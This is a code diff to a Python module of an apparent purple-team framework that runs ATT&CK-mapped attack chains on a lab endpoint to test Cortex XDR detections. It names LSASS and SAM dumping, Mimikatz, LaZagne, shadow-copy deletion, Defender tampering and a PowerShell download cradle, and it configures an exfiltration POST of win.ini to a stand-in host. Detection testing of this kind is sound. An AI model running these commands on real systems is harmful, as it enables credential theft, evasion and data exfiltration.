@@ -28,6 +28,14 @@ class NetworkEvent:
     event: str
     context: dict = field(default_factory=dict)
     external: bool = False   # True => use the egress/public IP as src_ip (Zscaler, perimeter FW)
+    # CONDITIONAL emission: when set, this event is emitted ONLY if the step's real
+    # technique produced a truthy output under this key (ExecResult.outputs[<key>]).
+    # Lets a step carry a synthetic network half that pairs with an OPTIONAL behaviour
+    # (e.g. the cradle's egress half, emitted only when a real http(s) url was fetched
+    # -> outputs["remote"] is True). The scorecard scores only what was emitted
+    # (orchestrator records summary["network_emitted"]), so a run that didn't take the
+    # conditional path never reads as a network miss.
+    only_if_output: Optional[str] = None
 
 
 @dataclass
@@ -112,6 +120,21 @@ def _internal_lateral_net() -> List["NetworkEvent"]:
     ]
 
 
+def _remote_fetch_egress(gate="remote") -> List["NetworkEvent"]:
+    """The perimeter half of an outbound tool/script fetch, emitted ONLY when the step
+    really reached out (outputs[gate] truthy). A web-proxy record that names the exact
+    URL/host/hash the box fetched (Zscaler `sandbox_threat` consumes the run artifact),
+    plus the firewall egress fan-out. The orchestrator pins the destination from the
+    run artifact (the fetched host -> `domain`), so the fired URL and the perimeter
+    egress agree. Used by the cradle's optional http(s)-url mode; a file:// run emits
+    none of it."""
+    evs = [NetworkEvent("Zscaler Web Gateway", "sandbox_threat")]
+    evs += _fw_egress()                    # C2_EGRESS; domain pinned at emit time
+    for e in evs:
+        e.only_if_output = gate
+    return evs
+
+
 # ── Detection / ATT&CK catalog ─────────────────────────────────────────────────
 # Maps each validated technique id to its ATT&CK (tactic, technique name) and a
 # best-effort set of alert-name substrings it should trigger. _annotate() fills any
@@ -129,6 +152,14 @@ TECHNIQUE_CATALOG = {
     "T1087.001": {"tactic": "Discovery", "technique": "Account Discovery: Local Account", "expected_alerts": []},
     "T1518.001": {"tactic": "Discovery", "technique": "Security Software Discovery", "expected_alerts": ["Security Software"]},
     "T1105":     {"tactic": "Command and Control", "technique": "Ingress Tool Transfer", "expected_alerts": ["Ingress Tool", "LOLBin", "Download"]},
+    # Builtin download_cradle payload. Cortex keys on the deobfuscated script block
+    # (WebClient + DownloadString + Invoke-Expression); best-effort names, tune per tenant.
+    "T1059.001": {"tactic": "Execution", "technique": "Command and Scripting Interpreter: PowerShell",
+                  "expected_alerts": ["Suspicious PowerShell", "PowerShell", "DownloadString", "Invoke-Expression", "Download Cradle", "WebClient", "Encoded"]},
+    # Builtin encoded_command payload. powershell.exe -EncodedCommand <base64>; the
+    # detector keys on the encoded-command flag + blob. Best-effort names, tune per tenant.
+    "T1027.010": {"tactic": "Defense Evasion", "technique": "Obfuscated Files or Information: Command Obfuscation",
+                  "expected_alerts": ["Encoded", "Obfuscat", "Suspicious PowerShell", "PowerShell", "EncodedCommand", "Base64", "enc"]},
     # Names the agent actually raised on 2026-11-18 (XDR Agent, box-tied):
     # "Credential Gathering Protection - <id>" (many ids, one per rule hit) and
     # "Memory dumping with comsvcs.dll". Matching is case-insensitive substring.
@@ -144,6 +175,46 @@ TECHNIQUE_CATALOG = {
     # XDR Agent, high, action "Detected (Post Detected)", ~10 min after the run (the
     # file stays on disk so the agent can upload it for the verdict).
     "T1204.002": {"tactic": "Execution", "technique": "User Execution: Malicious File", "expected_alerts": ["WildFire Malware"]},
+    # Builtin squiblydoo payload. Best-effort names (BTP / LOLBin regsvr32 abuse);
+    # confirm against the tenant on the first run and tune these substrings.
+    "T1218.010": {"tactic": "Defense Evasion", "technique": "System Binary Proxy Execution: Regsvr32",
+                  "expected_alerts": ["Regsvr32", "Squiblydoo", "scrobj", "Signed Binary Proxy", "LOLBIN"]},
+    # Builtin vss_shadow_delete payload. Best-effort names (ransomware / inhibit-
+    # recovery); confirm against the tenant on the first run and tune these.
+    "T1490":     {"tactic": "Impact", "technique": "Inhibit System Recovery",
+                  "expected_alerts": ["Shadow Cop", "Volume Shadow", "Inhibit System Recovery", "vssadmin", "Ransomware"]},
+    # ── P4 scenario techniques (builtin payloads). expected_alerts are best-effort
+    # ── Cortex names; tune against the tenant after the first run.
+    "T1486":     {"tactic": "Impact", "technique": "Data Encrypted for Impact",
+                  "expected_alerts": ["Ransomware", "Encrypt", "Mass", "File Modification", "Behavioral Threat"]},
+    "T1003.002": {"tactic": "Credential Access", "technique": "OS Credential Dumping: Security Account Manager",
+                  "expected_alerts": ["SAM", "Registry Hive", "reg save", "Credential Gathering", "Credential Dump"]},
+    "T1555":     {"tactic": "Credential Access", "technique": "Credentials from Password Stores",
+                  "expected_alerts": ["LaZagne", "Credential", "Password Store", "Hacktool", "Credential Gathering"]},
+    "T1218.005": {"tactic": "Defense Evasion", "technique": "System Binary Proxy Execution: Mshta",
+                  "expected_alerts": ["Mshta", "mshta", "Signed Binary Proxy", "LOLBIN", "Suspicious"]},
+    "T1127.001": {"tactic": "Defense Evasion", "technique": "Trusted Developer Utilities Proxy Execution: MSBuild",
+                  "expected_alerts": ["MSBuild", "Trusted Developer", "LOLBIN", "Code Execution", "Suspicious"]},
+    "T1562.001": {"tactic": "Defense Evasion", "technique": "Impair Defenses: Disable or Modify Tools",
+                  "expected_alerts": ["Impair", "Defender", "Tamper", "Real-time", "Disable", "Exclusion"]},
+    "T1070.001": {"tactic": "Defense Evasion", "technique": "Indicator Removal: Clear Windows Event Logs",
+                  "expected_alerts": ["Clear", "Event Log", "wevtutil", "Indicator Removal", "Log Clear"]},
+    "T1543.003": {"tactic": "Persistence", "technique": "Create or Modify System Process: Windows Service",
+                  "expected_alerts": ["Service", "New Service", "sc.exe", "Service Creation", "Persistence"]},
+    "T1546.003": {"tactic": "Persistence", "technique": "Event Triggered Execution: WMI Event Subscription",
+                  "expected_alerts": ["WMI", "Event Subscription", "Event Consumer", "Persistence", "CommandLineEventConsumer"]},
+    # ── Atomic-test-backed stages (vetted Red Canary tests run by test number via the
+    # ── executor -- no bespoke offensive payloads). Best-effort names; tune per tenant.
+    "T1548.002": {"tactic": "Privilege Escalation", "technique": "Abuse Elevation Control Mechanism: Bypass UAC",
+                  "expected_alerts": ["UAC", "Bypass User Account", "Fodhelper", "fodhelper", "Elevation", "Auto-elevate"]},
+    "T1036.003": {"tactic": "Defense Evasion", "technique": "Masquerading: Rename System Utilities",
+                  "expected_alerts": ["Masquerad", "Rename", "svchost", "LOLBIN", "Suspicious Process Name"]},
+    "T1136.001": {"tactic": "Persistence", "technique": "Create Account: Local Account",
+                  "expected_alerts": ["Account Creation", "New Local Account", "net user", "Create Account", "User Account"]},
+    "T1047":     {"tactic": "Execution", "technique": "Windows Management Instrumentation",
+                  "expected_alerts": ["WMI", "wmic", "Win32_Process", "WMI Process", "Process Creation"]},
+    "T1197":     {"tactic": "Defense Evasion", "technique": "BITS Jobs",
+                  "expected_alerts": ["BITS", "bitsadmin", "Background Intelligent", "Transfer Job"]},
 }
 
 
@@ -186,10 +257,15 @@ def panw_equivalents(network) -> List["NetworkEvent"]:
         if not ev:
             continue
         dom = ne.context.get("domain") if ev == "xdr_c2_beacon" else None
-        if (ev, dom) in seen:
+        # A conditional source event mirrors to a conditional PAN event on the SAME
+        # gate, so the default-vendor PAN rendering isn't emitted when the source half
+        # was gated off (e.g. the cradle's egress on a file:// run).
+        gate = getattr(ne, "only_if_output", None)
+        if (ev, dom, gate) in seen:
             continue
-        seen.add((ev, dom))
-        out.append(NetworkEvent(PANW_MODULE, ev, context={"domain": dom} if dom else {}))
+        seen.add((ev, dom, gate))
+        out.append(NetworkEvent(PANW_MODULE, ev, context={"domain": dom} if dom else {},
+                                external=ne.external, only_if_output=gate))
     return out
 
 
@@ -294,12 +370,48 @@ def get_quick_story() -> Story:
     )
 
 
+def get_recon_story() -> Story:
+    """Discovery/Recon sweep (TA0007) as a one-shot, fire-on-demand stage — the seven
+    low-signal host-recon techniques the reference kill-chain opens with, broken out so
+    the recon arc can be fired on its own. Every step is a read-only Atomic (systeminfo,
+    ipconfig/arp/route, whoami, tasklist, netstat, net user, AV/EDR discovery); the
+    netstat step is paired with a synthetic internal SMB share enumeration + port scan
+    from the box, so the on-box recon and the network recon stitch to one identity.
+    Non-destructive and nothing to clean up. These rarely alert alone (hence no
+    expected_alerts), but they build the behavioural picture and the correlation volume
+    the analytics key on."""
+    return Story(
+        id="xdr_recon",
+        name="XDR Recon Sweep: system / network / account / security discovery",
+        tactics=["Discovery"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Information (systeminfo / reg).", _wa("T1082")),
+            Step("Discovery — System Network Configuration (ipconfig / arp / route).", _wa("T1016")),
+            Step("Discovery — System Owner/User (whoami).", _wa("T1033")),
+            Step("Discovery — Process Discovery (tasklist).", _wa("T1057")),
+            Step("Discovery — System Network Connections (netstat), paired with synthetic "
+                 "internal SMB share enumeration and a port scan from the box.",
+                 _wa("T1049"), network=_internal_recon_net()),
+            Step("Discovery — Local Account enumeration (net user).", _wa("T1087.001")),
+            Step("Discovery — Security Software Discovery (find AV/EDR).", _wa("T1518.001"),
+                 post_delay=3.0),
+        ],
+    )
+
+
 # ── WildFire malware-delivery story ───────────────────────────────────────────
+
+def _builtin(tid: str, payload: str) -> dict:
+    """Builtin payload step spec (payloads.py), run by the executor over the same
+    channel as the Atomic tests but with no Atomic dependency."""
+    return {"id": tid, "executor": "builtin", "payload": payload}
+
 
 def _wildfire_pe() -> dict:
     """Builtin payload step spec: download + run Palo Alto's WildFire test PE
     (payloads.py). T1204.002 = User Execution: Malicious File."""
-    return {"id": "T1204.002", "executor": "builtin", "payload": "wildfire_pe"}
+    return _builtin("T1204.002", "wildfire_pe")
 
 
 def get_wildfire_story() -> Story:
@@ -331,6 +443,332 @@ def get_wildfire_story() -> Story:
                 cleanup=False,
                 post_delay=5.0,
             ),
+        ],
+    )
+
+
+# ── Builtin-payload behaviour stories (self-contained, no Atomic prereqs) ──────
+# Each pairs a light orient step with ONE high-signal builtin payload (payloads.py).
+# All are endpoint-only: the detection is the behaviour on the box, so there is no
+# synthetic network half. The payloads drop their files outside the Atomic allow-list
+# paths (like wildfire_pe) so the agent actually examines them.
+
+def get_shadow_delete_story() -> Story:
+    """Inhibit System Recovery (T1490) — the ransomware-prep move the Cortex agent
+    flags and usually PREVENTS: a process invoking vssadmin to delete volume shadow
+    copies. NON-DESTRUCTIVE by design — the payload targets a random, non-existent
+    shadow id, so no real shadow copy is removed while the command line the detector
+    keys on is still produced (payloads.py). Endpoint-only."""
+    return Story(
+        id="xdr_shadow_delete",
+        name="XDR Inhibit Recovery: vssadmin shadow-copy deletion (ransomware-prep)",
+        tactics=["Discovery", "Impact"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Owner/User (whoami), the operator orienting first.",
+                 _wa("T1033")),
+            Step("Impact — Inhibit System Recovery: invoke vssadmin to delete volume "
+                 "shadow copies (non-destructive — a non-existent shadow id).",
+                 _builtin("T1490", "vss_shadow_delete"),
+                 cleanup=False, post_delay=3.0),
+        ],
+    )
+
+
+def get_procdump_story() -> Story:
+    """OS Credential Dumping: LSASS Memory (T1003.001) with a SIGNED tool. Downloads
+    Sysinternals ProcDump to C:\\Users\\Public\\Downloads (outside the Atomic allow-list)
+    and runs `procdump -ma lsass.exe`, so the agent's Credential Gathering / LSASS-
+    access detection fires on a legitimately-signed binary — a complement to the
+    comsvcs.dll MiniDump path in the intrusion/lateral stories. The dump (LSASS
+    memory) is deleted immediately; the tool is cleaned up after. Endpoint-only."""
+    return Story(
+        id="xdr_procdump",
+        name="XDR Credential Dumping: ProcDump LSASS memory dump (signed tool)",
+        tactics=["Discovery", "Credential Access"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Owner/User (whoami).", _wa("T1033")),
+            Step("Credential Access — download Sysinternals ProcDump and dump LSASS "
+                 "memory; the dump is deleted at once, the tool cleaned up after.",
+                 _builtin("T1003.001", "procdump_lsass"),
+                 cleanup=True, post_delay=3.0),
+        ],
+    )
+
+
+def get_squiblydoo_story() -> Story:
+    """Signed Binary Proxy Execution: Regsvr32 / Squiblydoo (T1218.010). Stages a
+    benign COM scriptlet and runs `regsvr32 /s /n /u /i:<sct> scrobj.dll`, so regsvr32
+    proxy-executes script and spawns a child process — the behaviour the Cortex
+    agent's BTP flags. The scriptlet only writes a marker (no real payload); scriptlet
+    and marker are cleaned up after. Endpoint-only (local scriptlet, no fetch)."""
+    return Story(
+        id="xdr_squiblydoo",
+        name="XDR Squiblydoo: regsvr32 scrobj.dll proxy execution (LOLBin)",
+        tactics=["Discovery", "Defense Evasion"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Owner/User (whoami).", _wa("T1033")),
+            Step("Defense Evasion — Squiblydoo: regsvr32 proxy-executes a local COM "
+                 "scriptlet via scrobj.dll; scriptlet + marker cleaned up after.",
+                 _builtin("T1218.010", "squiblydoo"),
+                 cleanup=True, post_delay=3.0),
+        ],
+    )
+
+
+def get_cradle_story() -> Story:
+    """Command and Scripting Interpreter: PowerShell (T1059.001) — the classic
+    `IEX (New-Object Net.WebClient).DownloadString(<url>)` download cradle. Cortex's
+    behavioral / command-line analytics key on the deobfuscated script block
+    (WebClient + DownloadString + Invoke-Expression), so the detection fires on the
+    command-line SHAPE, not on what runs. Benign + self-contained by default: the
+    payload stages a tiny LOCAL marker-writing script and points the cradle at it over
+    a file:// URL, so no bytes leave the box and IEX only ever runs our own marker
+    write (payloads.py). The cradle runs as a real CHILD powershell.exe with the literal
+    on its command line (deliberately NOT via the base64/certutil delivery that hides
+    legit scripts) so the agent sees exactly the artifact. Script + marker cleaned up
+    after. Endpoint-only by default. An http(s) url can be passed per run for a true-
+    egress test; in THAT mode the step also emits a synthetic perimeter half (web-proxy
+    record naming the fetched URL + firewall egress), pinned to the same host, so the
+    scorecard shows a network-sourced detection too. A file:// run emits none of it."""
+    return Story(
+        id="xdr_cradle",
+        name="XDR Download Cradle: IEX WebClient.DownloadString (PowerShell)",
+        tactics=["Discovery", "Execution"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Owner/User (whoami).", _wa("T1033")),
+            Step("Execution — PowerShell download cradle: a child powershell.exe runs "
+                 "`IEX (New-Object Net.WebClient).DownloadString(<url>)` (benign local "
+                 "file:// script by default); script + marker cleaned up after. With an "
+                 "http(s) url, a synthetic perimeter egress half is emitted too.",
+                 _builtin("T1059.001", "download_cradle"),
+                 network=_remote_fetch_egress(),
+                 cleanup=True, post_delay=3.0),
+        ],
+    )
+
+
+def get_encoded_story() -> Story:
+    """Obfuscated Files or Information: Command Obfuscation (T1027.010) — the
+    `powershell.exe -EncodedCommand <base64>` pattern. A near-universal "suspicious
+    PowerShell" heuristic keys on the -EncodedCommand/-enc flag carrying a base64
+    UTF-16LE blob on a powershell command line. Benign: the decoded command only
+    writes a marker and prints a line (payloads.py). Run as a real CHILD
+    powershell.exe with the encoded blob on ITS command line — deliberately NOT via
+    the base64/certutil delivery that hides legit scripts (that delivery exists to
+    AVOID this very alert), so the agent sees exactly the artifact. Marker cleaned up
+    after. Endpoint-only."""
+    return Story(
+        id="xdr_encoded",
+        name="XDR Encoded Command: powershell.exe -EncodedCommand (base64)",
+        tactics=["Discovery", "Defense Evasion"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Owner/User (whoami).", _wa("T1033")),
+            Step("Defense Evasion — Command Obfuscation: a child powershell.exe runs a "
+                 "base64 `-EncodedCommand` of a benign marker write; marker cleaned up after.",
+                 _builtin("T1027.010", "encoded_command"),
+                 cleanup=True, post_delay=3.0),
+        ],
+    )
+
+
+def get_tamper_story() -> Story:
+    """Impair Defenses: Disable or Modify Tools (T1562.001) — a REVERSIBLE tamper.
+    Reuses the `disable_defender` builtin (payloads.py): disable Defender real-time
+    protection and add a benign exclusion path, then revert BOTH immediately (the
+    detection fires on the attempt; protection is left ON). Cleanup re-asserts the
+    revert as a belt-and-suspenders. This is the same payload the `xdr_evasion` chain
+    uses, broken out as a one-shot so the tamper trigger can be fired on its own.
+    Endpoint-only. If Tamper Protection is on, the disable is blocked — itself the
+    detection."""
+    return Story(
+        id="xdr_tamper",
+        name="XDR Impair Defenses: disable Defender real-time protection (reverted)",
+        tactics=["Discovery", "Defense Evasion"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery — System Owner/User (whoami).", _wa("T1033")),
+            Step("Defense Evasion — Impair Defenses: disable Defender real-time "
+                 "protection and add an exclusion, then revert both immediately.",
+                 _builtin("T1562.001", "disable_defender"),
+                 cleanup=True, post_delay=3.0),
+        ],
+    )
+
+
+# ── P4 scenario stories (recombine builtins + validated Atomic steps) ──────────
+
+def get_ransomware_story() -> Story:
+    """A ransomware kill-chain — Cortex's flagship behavioural detection. Recon →
+    LSASS credential dump (comsvcs) → shadow-copy deletion (inhibit recovery) → a
+    NON-DESTRUCTIVE mass-encryption simulation in a scratch dir with a ransom note.
+    The shadow-delete + mass file rewrite/rename + note is the classic ransomware
+    behaviour the agent flags."""
+    return Story(
+        id="xdr_ransomware",
+        name="XDR Ransomware: recon -> LSASS dump -> shadow-copy deletion -> mass-encryption sim",
+        tactics=["Discovery", "Credential Access", "Impact"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery - System Owner/User (whoami).", _wa("T1033")),
+            Step("Credential Access - LSASS MiniDump via comsvcs.dll; cleaned up after.",
+                 _wa("T1003.001", "2"), cleanup=True),
+            Step("Impact - Inhibit System Recovery: vssadmin shadow-copy deletion "
+                 "(non-destructive; a non-existent shadow id).",
+                 _builtin("T1490", "vss_shadow_delete"), post_delay=2.0),
+            Step("Impact - Data Encrypted for Impact: simulate mass file encryption in a "
+                 "scratch dir and drop a ransom note (scratch dir only, cleaned up after).",
+                 _builtin("T1486", "ransomware_sim"), cleanup=True, post_delay=3.0),
+        ],
+    )
+
+
+def get_cred_theft_story() -> Story:
+    """Hands-on-keyboard credential theft with real tooling: LOLBin ingress -> Mimikatz
+    (staged) -> SAM/SYSTEM/SECURITY hive dump via reg.exe -> LaZagne (staged) -> HTTP
+    exfil with aligned synthetic network. Mimikatz/LaZagne are staged by the Kickstarter;
+    if the agent blocked their download, those steps report 'not staged' (itself a
+    signal) and the LOLBin SAM dump still fires."""
+    exfil_domain = "cred-dropbox-sync.net"
+    return Story(
+        id="xdr_cred_theft",
+        name="XDR Credential Theft: ingress -> Mimikatz -> SAM dump -> LaZagne -> exfil",
+        tactics=["Command & Control", "Credential Access", "Exfiltration"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Ingress Tool Transfer - LOLBin download via MpCmdRun.exe, paired with a "
+                 "synthetic large web download.",
+                 _wa("T1105", "13"),
+                 network=[NetworkEvent("Zscaler Web Gateway", "large_download", external=True)]),
+            Step("Credential Access - run Mimikatz (sekurlsa::logonpasswords) from the "
+                 "staged copy.", _builtin("T1003.001", "mimikatz"), post_delay=2.0),
+            Step("Credential Access - dump the SAM/SYSTEM/SECURITY registry hives via "
+                 "reg.exe; the hives are deleted at once.",
+                 _builtin("T1003.002", "sam_hive_dump"), cleanup=True),
+            Step("Credential Access - run the LaZagne harvester from the staged copy.",
+                 _builtin("T1555", "lazagne"), post_delay=2.0),
+            Step("Exfiltration Over Alternative Protocol - the endpoint POSTs over HTTP to "
+                 "the exfil domain, paired with synthetic web upload + DNS tunnel + egress.",
+                 _wa("T1048.003", "4"),
+                 params={"domain": exfil_domain, "protocol": "https", "port": 443,
+                         "input_args": {"input_file": r"C:\Windows\win.ini",
+                                        "ip_address": f"http://{exfil_domain}/upload"}},
+                 network=[
+                     NetworkEvent("Zscaler Web Gateway", "data_exfil",
+                                  context={"domain": exfil_domain}, external=True),
+                     NetworkEvent("Infoblox NIOS", "DNS_TUNNEL"),
+                     *_fw_egress(exfil_domain),
+                 ], post_delay=2.0),
+        ],
+    )
+
+
+def get_evasion_story() -> Story:
+    """A LOLBin / defense-evasion chain: two signed-binary proxy executions (Squiblydoo
+    regsvr32, then mshta), a trusted-developer-utility proxy (MSBuild inline task),
+    disabling Defender real-time protection (reverted), and clearing an event log. All
+    endpoint-only Behavioral Threat Protection triggers; artifacts cleaned up / reverted."""
+    return Story(
+        id="xdr_evasion",
+        name="XDR Defense Evasion: Squiblydoo -> mshta -> MSBuild -> disable Defender -> clear log",
+        tactics=["Discovery", "Defense Evasion"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery - System Owner/User (whoami).", _wa("T1033")),
+            Step("Defense Evasion - Squiblydoo: regsvr32 proxy-executes a local scriptlet.",
+                 _builtin("T1218.010", "squiblydoo"), cleanup=True),
+            Step("Defense Evasion - mshta proxy-executes a local scriptlet.",
+                 _builtin("T1218.005", "mshta_proxy"), cleanup=True),
+            Step("Defense Evasion - MSBuild compiles and runs an inline C# task.",
+                 _builtin("T1127.001", "msbuild_inline"), cleanup=True),
+            Step("Defense Evasion - Impair Defenses: disable Defender real-time protection "
+                 "and add an exclusion, then revert.",
+                 _builtin("T1562.001", "disable_defender"), cleanup=True),
+            Step("Defense Evasion - Indicator Removal: clear an event log via wevtutil "
+                 "(an own custom log; non-destructive).",
+                 _builtin("T1070.001", "clear_event_log"), cleanup=True, post_delay=2.0),
+        ],
+    )
+
+
+def get_persistence_sweep_story() -> Story:
+    """A persistence sweep: Registry Run key and a Scheduled Task (Atomic), then a new
+    Windows service, a WMI permanent event subscription, and a Startup-folder shortcut
+    (builtins). Every foothold is removed in cleanup, so the box is left clean while the
+    agent still sees five distinct persistence techniques."""
+    return Story(
+        id="xdr_persistence_sweep",
+        name="XDR Persistence Sweep: Run key -> scheduled task -> service -> WMI sub -> startup",
+        tactics=["Discovery", "Persistence"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery - System Owner/User (whoami).", _wa("T1033")),
+            Step("Persistence - Registry Run Key (HKCU ...\\Run); cleaned up after.",
+                 _wa("T1547.001"), cleanup=True),
+            Step("Persistence - Scheduled Task (schtasks); cleaned up after.",
+                 _wa("T1053.005"), cleanup=True),
+            Step("Persistence - create a Windows service via sc.exe; deleted after.",
+                 _builtin("T1543.003", "new_service"), cleanup=True),
+            Step("Persistence - WMI permanent event subscription; removed after.",
+                 _builtin("T1546.003", "wmi_subscription"), cleanup=True),
+            Step("Persistence - drop a .lnk in the common Startup folder; removed after.",
+                 _builtin("T1547.001", "startup_folder"), cleanup=True, post_delay=2.0),
+        ],
+    )
+
+
+def get_privesc_story() -> Story:
+    """Privilege escalation -> evasion -> foothold, built entirely from VETTED Atomic
+    Red Team tests (run by pinned test number via the executor -- no bespoke offensive
+    payloads). Each pinned test is non-destructive, self-contained (no remote
+    download), and has Atomic cleanup, which the step runs:
+      * T1548.002-4  Bypass UAC via Fodhelper (PowerShell); HKCU ms-settings hijack.
+      * T1036.003-7  Rename a built-in exe (cmd.exe -> svchost.exe in %TEMP%) and run it.
+      * T1136.001-4  Create a local user with net.exe; cleanup deletes it.
+    This fills Privilege Escalation, which no other story covered."""
+    return Story(
+        id="xdr_privesc",
+        name="XDR Privilege Escalation & Foothold: UAC bypass -> masquerade -> local account",
+        tactics=["Discovery", "Privilege Escalation", "Defense Evasion", "Persistence"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery - System Owner/User (whoami).", _wa("T1033")),
+            Step("Privilege Escalation - Bypass UAC via Fodhelper (HKCU ms-settings hijack); "
+                 "cleaned up after.", _wa("T1548.002", "4"), cleanup=True),
+            Step("Defense Evasion - Masquerading: copy a built-in exe to a trusted name "
+                 "(svchost.exe) and run it; cleaned up after.", _wa("T1036.003", "7"), cleanup=True),
+            Step("Persistence - Create Account: add a local user via net.exe; the account "
+                 "is deleted after.", _wa("T1136.001", "4"), cleanup=True, post_delay=2.0),
+        ],
+    )
+
+
+def get_lolbin_story() -> Story:
+    """LOLBin execution + transfer, from VETTED Atomic Red Team tests (run by pinned
+    test number -- no bespoke payloads). Both are Windows, non-destructive, self-
+    contained enough for a lab, and cleanup-capable:
+      * T1047-5    WMI Execute Local Process: wmic process call create notepad.exe;
+                   cleanup ends the process.
+      * T1197-1    Bitsadmin Download: bitsadmin /transfer creates a BITS job that
+                   fetches a benign Atomic-repo markdown (not executed); cleanup
+                   deletes the file. The BITS job creation is the detection; a failed
+                   download is non-fatal."""
+    return Story(
+        id="xdr_lolbin",
+        name="XDR LOLBin: WMI process execution -> BITS transfer job",
+        tactics=["Discovery", "Execution", "Defense Evasion"],
+        anchor_dhcp=True, anchor_logon=True,
+        steps=[
+            Step("Discovery - System Owner/User (whoami).", _wa("T1033")),
+            Step("Execution - WMI: create a process via wmic (Win32_Process Create); "
+                 "the process is ended after.", _wa("T1047", "5"), cleanup=True),
+            Step("Defense Evasion - BITS Jobs: create a BITS transfer job via bitsadmin; "
+                 "the downloaded file is deleted after.", _wa("T1197", "1"),
+                 cleanup=True, post_delay=2.0),
         ],
     )
 
@@ -651,12 +1089,25 @@ def load_yaml_stories(story_dir: str = STORY_DIR, *, verbose: bool = False) -> d
 
 _STORY_BUILDERS = {
     "xdr_quick":       get_quick_story,
+    "xdr_recon":       get_recon_story,
     "xdr_reference":   get_reference_story,
     "xdr_intrusion":   get_intrusion_story,
     "xdr_lateral":     get_lateral_story,
     "xdr_persistence": get_persistence_story,
     "xdr_fullchain":   get_fullchain_story,
     "xdr_wildfire":    get_wildfire_story,
+    "xdr_shadow_delete": get_shadow_delete_story,
+    "xdr_procdump":      get_procdump_story,
+    "xdr_squiblydoo":    get_squiblydoo_story,
+    "xdr_cradle":        get_cradle_story,
+    "xdr_encoded":       get_encoded_story,
+    "xdr_tamper":        get_tamper_story,
+    "xdr_ransomware":         get_ransomware_story,
+    "xdr_cred_theft":         get_cred_theft_story,
+    "xdr_evasion":            get_evasion_story,
+    "xdr_persistence_sweep":  get_persistence_sweep_story,
+    "xdr_privesc":            get_privesc_story,
+    "xdr_lolbin":             get_lolbin_story,
 }
 # YAML stories add to / override the built-ins (user-authored canon lives in files).
 _STORY_BUILDERS.update(load_yaml_stories())
@@ -792,6 +1243,45 @@ def all_technique_ids() -> list:
             if st.technique["id"] not in ids:
                 ids.append(st.technique["id"])
     return ids
+
+
+def all_atomic_tests() -> list:
+    """Every distinct Atomic (technique id, test numbers) the stories actually fire:
+    [{"id": "T1105", "test_numbers": "13"}, ...], one row per technique with its test
+    numbers unioned across stories. The Kickstarter resolves prereqs with these EXACT
+    test numbers (`-GetPrereqs -TestNumbers ...`) instead of per-technique, so Atomic
+    only stages what the pinned tests need -- it never tries to satisfy unrelated
+    tests' prereqs (e.g. cloud tests that pull the retired AzureAD module and then
+    report 'failed to meet prerequisites'). Builtin steps are skipped."""
+    by_id = {}            # id -> list of test-number tokens, in first-seen order
+    for build in _STORY_BUILDERS.values():
+        for st in build().steps:
+            t = st.technique or {}
+            if t.get("executor") == "builtin":
+                continue
+            tid = t.get("id")
+            if not tid:
+                continue
+            seen = by_id.setdefault(tid, [])
+            for tok in str(t.get("test_numbers") or "1").split(","):
+                tok = tok.strip()
+                if tok and tok not in seen:
+                    seen.append(tok)
+    return [{"id": tid, "test_numbers": ",".join(toks)} for tid, toks in by_id.items()]
+
+
+def all_builtin_payloads() -> list:
+    """Every distinct builtin payload name across all stories (the counterpart to
+    all_technique_ids, which SKIPS builtin steps). The Kickstarter stages whatever
+    tooling these need (e.g. ProcDump for procdump_lsass) so the builtin stages work
+    without a runtime download."""
+    out = []
+    for build in _STORY_BUILDERS.values():
+        for st in build().steps:
+            t = st.technique or {}
+            if t.get("executor") == "builtin" and t.get("payload") and t["payload"] not in out:
+                out.append(t["payload"])
+    return out
 
 
 def get_story(story_id: str) -> Optional[Story]:
